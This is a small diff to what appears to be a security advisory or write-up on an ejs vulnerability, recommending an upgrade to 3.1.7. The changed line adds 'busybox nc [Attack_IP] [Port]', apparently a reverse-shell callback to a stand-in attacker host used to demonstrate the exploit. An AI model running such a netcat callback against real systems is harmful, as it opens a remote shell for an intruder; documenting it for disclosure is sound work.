@@ -259,7 +259,7 @@ Upgrading <code>ejs</code> to version 3.1.7 or higher</p>
 
 ![image](https://github.com/user-attachments/assets/f583c7d5-b76f-4828-93d3-3ba1aa857ced)
 
-<p>busybox ....</p>
+<p>busybox nc [Attack_IP] [Port]....</p>
 
 ![image](https://github.com/user-attachments/assets/cbb08e50-5d7c-4216-b366-91d947eb1774)
 
